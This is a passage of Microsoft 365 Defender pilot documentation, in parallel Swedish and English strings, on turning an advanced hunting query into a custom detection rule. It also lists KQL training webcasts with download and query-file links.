<span data-ttu-id="7ad86-343">Anpassade identifieringar kör frågan utifrån den frekvens som du anger och resultaten för frågorna skapar säkerhets varningar baserat på de objekt du väljer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="7ad86-344">Dessa meddelanden kommer att korreleras med tillbud och kan triaged som annan säkerhets varning som genereras av en av produkterna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="7ad86-345">På sidan fråga tar du bort raderna 7 och 8 som lades till i steg 7 i anvisningarna för att få läsa och klickar på **skapa detektions regel**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![Skärm bild av var du kan klicka på Skapa detektions regel på sidan Advanced jakt](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="7ad86-347">Om du klickar på regeln för att **skapa en identifiering** och det finns syntaxfel i frågan sparas inte identifierings regeln.</span><span class="sxs-lookup"><span data-stu-id="7ad86-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="7ad86-348">Dubbelkolla din fråga för att se till att det inte finns några fel.</span><span class="sxs-lookup"><span data-stu-id="7ad86-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="7ad86-349">Fyll i de obligatoriska fälten med den information som gör att säkerhets teamet kan förstå varningen, varför det genererades och vilka åtgärder du förväntar dig.</span><span class="sxs-lookup"><span data-stu-id="7ad86-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

   ![Skärm bild av sidan Skapa en detektions regel där du kan ange aviserings information](../../media/mtp/fig23.png)

   <span data-ttu-id="7ad86-351">Kontrol lera att du fyller i fälten med klarhet för att ge nästa användare ett välgrundat beslut om den här varningen för identifierings regel</span><span class="sxs-lookup"><span data-stu-id="7ad86-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="7ad86-352">Välj vilka enheter som påverkas av den här aviseringen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="7ad86-353">I det här fallet väljer du **enhet** och **post låda**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![Skärm bild av sidan Skapa detektions regel där du kan välja parametrar för de enheter som påverkas](../../media/mtp/fig24.png)

4. <span data-ttu-id="7ad86-355">Ta reda på vilka åtgärder som ska vidtas om notifieringen utlöses.</span><span class="sxs-lookup"><span data-stu-id="7ad86-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="7ad86-356">I det här fallet kör du en Antivirus genomsökning, men andra åtgärder kan vidtas.</span><span class="sxs-lookup"><span data-stu-id="7ad86-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![Skärm bild av sidan för att skapa en detektions regel där du kan köra en Antivirus sökning när en avisering utlöses för att skydda hoten](../../media/mtp/fig25.png)

5. <span data-ttu-id="7ad86-358">Välj omfattning för aviserings regeln.</span><span class="sxs-lookup"><span data-stu-id="7ad86-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="7ad86-359">Eftersom den här frågan gäller enheter är enhets grupperna relevanta i denna anpassade identifiering enligt Microsoft Defender för slut punkts kontext.</span><span class="sxs-lookup"><span data-stu-id="7ad86-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="7ad86-360">När du skapar en anpassad identifiering som inte innehåller enheter som påverkade enheter gäller inte omfattningen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![Skärm bild av sidan Skapa detektions regel där du kan ställa in omfattningen för notifieringsregeln för att hantera dina förväntningar för de resultat du kommer att se](../../media/mtp/fig26.png)

   <span data-ttu-id="7ad86-362">För denna pilot kanske du vill begränsa den här regeln till en delmängd av test enheter i produktions miljön.</span><span class="sxs-lookup"><span data-stu-id="7ad86-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="7ad86-363">Välj **Skapa**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-363">Select **Create**.</span></span> <span data-ttu-id="7ad86-364">Välj sedan **anpassade identifierings regler** från navigerings panelen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![Skärm bild av alternativet anpassade regler för dubblettidentifiering på menyn](../../media/mtp/fig27a.png)

   ![Skärm bild av sidan identifierings regler som visar information om regler och körningar](../../media/mtp/fig27b.png)

   <span data-ttu-id="7ad86-367">Från den här sidan kan du välja identifierings regeln, som öppnar en informations sida.</span><span class="sxs-lookup"><span data-stu-id="7ad86-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![Skärm bild av sidan med e-postbilagor där du kan se status för regel körning, utlösnings aviseringar och åtgärder, redigera identifieringen och så vidare](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="7ad86-369">Ytterligare avancerade övningar</span><span class="sxs-lookup"><span data-stu-id="7ad86-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="7ad86-370">För att lära dig mer om Advanced jakt kan följande webb sändningar vägleda dig genom de avancerade jakternas funktioner i Microsoft 365 Defender för att skapa frågor från flera pelaren, pivotera till enheter och skapa anpassade identifierings-och reparations åtgärder.</span><span class="sxs-lookup"><span data-stu-id="7ad86-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-371">Förbered dig med ditt eget GitHub-konto för att köra jakt frågorna i test laboratorie miljön för pilot.</span><span class="sxs-lookup"><span data-stu-id="7ad86-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

|<span data-ttu-id="7ad86-372">Title</span><span class="sxs-lookup"><span data-stu-id="7ad86-372">Title</span></span>|<span data-ttu-id="7ad86-373">Beskrivning</span><span class="sxs-lookup"><span data-stu-id="7ad86-373">Description</span></span>|<span data-ttu-id="7ad86-374">Ladda ner MP4</span><span class="sxs-lookup"><span data-stu-id="7ad86-374">Download MP4</span></span>|<span data-ttu-id="7ad86-375">Titta på YouTube</span><span class="sxs-lookup"><span data-stu-id="7ad86-375">Watch on YouTube</span></span>|<span data-ttu-id="7ad86-376">CSL fil som ska användas</span><span class="sxs-lookup"><span data-stu-id="7ad86-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="7ad86-377">Avsnitt 1: grundläggande om Keyword</span><span class="sxs-lookup"><span data-stu-id="7ad86-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="7ad86-378">Vi kommer att få grunderna i de avancerade jakt funktionerna i Microsoft 365 Defender.</span><span class="sxs-lookup"><span data-stu-id="7ad86-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="7ad86-379">Läs mer om tillgängliga avancerade jakt data och grundläggande Keyword-syntax och-operatörer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="7ad86-380">MP4</span><span class="sxs-lookup"><span data-stu-id="7ad86-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="7ad86-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="7ad86-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="7ad86-382">Avsnitt 1: CSL-fil i git</span><span class="sxs-lookup"><span data-stu-id="7ad86-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="7ad86-383">Avsnitt 2: kopplingar</span><span class="sxs-lookup"><span data-stu-id="7ad86-383">Episode 2: Joins</span></span>|<span data-ttu-id="7ad86-384">Vi fortsätter att lära sig mer om data i avancerad jakt och hur du ansluter samman tabeller.</span><span class="sxs-lookup"><span data-stu-id="7ad86-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="7ad86-385">Lär dig mer om inre, yttre, unika och mellananslutna och Nuances för standard Kusto innerunique Join.</span><span class="sxs-lookup"><span data-stu-id="7ad86-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="7ad86-386">MP4</span><span class="sxs-lookup"><span data-stu-id="7ad86-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="7ad86-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="7ad86-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="7ad86-388">Avsnitt 2: CSL-fil i git</span><span class="sxs-lookup"><span data-stu-id="7ad86-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="7ad86-389">Avsnitt 3: summera, pivotera och visualisera data</span><span class="sxs-lookup"><span data-stu-id="7ad86-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="7ad86-390">Nu när vi kan filtrera, hantera och koppla data är det dags att börja sammanfatta, kvantifiera, pivotera och visualisera.</span><span class="sxs-lookup"><span data-stu-id="7ad86-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="7ad86-391">I det här avsnittet ska vi gå igenom den sammanfattande operatorn och vissa av de beräkningar som du kan utföra när du dykresa till ytterligare tabeller i det avancerade stöldskydds schemat.</span><span class="sxs-lookup"><span data-stu-id="7ad86-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="7ad86-392">Vi förvandlar våra data uppsättningar till diagram som kan hjälpa till att förbättra analyser.</span><span class="sxs-lookup"><span data-stu-id="7ad86-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="7ad86-393">MP4</span><span class="sxs-lookup"><span data-stu-id="7ad86-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="7ad86-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="7ad86-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="7ad86-395">Avsnitt 3: CSL-fil i git</span><span class="sxs-lookup"><span data-stu-id="7ad86-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="7ad86-396">Avsnitt 4: Låt oss titta!</span><span class="sxs-lookup"><span data-stu-id="7ad86-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="7ad86-397">Använda Keyword i händelse spårning</span><span class="sxs-lookup"><span data-stu-id="7ad86-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="7ad86-398">Tid för att spåra viss angripares aktivitet!</span><span class="sxs-lookup"><span data-stu-id="7ad86-398">Time to track some attacker activity!</span></span> <span data-ttu-id="7ad86-399">I det här avsnittet ska vi använda vår förbättrade förståelse av Keyword och avancerad jakt i Microsoft 365 Defender för att spåra ett angrepp.</span><span class="sxs-lookup"><span data-stu-id="7ad86-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="7ad86-400">Lär dig mer om de tips och tricks som används i fältet för att spåra angrepps aktivitet, inklusive ABCs Cybersecurity och hur du använder dem för att söka efter händelser.</span><span class="sxs-lookup"><span data-stu-id="7ad86-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="7ad86-401">MP4</span><span class="sxs-lookup"><span data-stu-id="7ad86-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="7ad86-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="7ad86-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="7ad86-403">Avsnitt 4: CSL-fil i git</span><span class="sxs-lookup"><span data-stu-id="7ad86-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="7ad86-404">Nästa steg</span><span class="sxs-lookup"><span data-stu-id="7ad86-404">Next step</span></span>

|<span data-ttu-id="7ad86-405">![Stänga och sammanfatta fasen](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="7ad86-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="7ad86-406">Stänga och sammanfatta fasen</span><span class="sxs-lookup"><span data-stu-id="7ad86-406">Closing and summary phase</span></span>](mtp-pilot-close.md)|<span data-ttu-id="7ad86-407">Analysera ditt Microsoft 365 Defender pilot resultat, presentera dem för dina intressenter och ta nästa steg.</span><span class="sxs-lookup"><span data-stu-id="7ad86-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
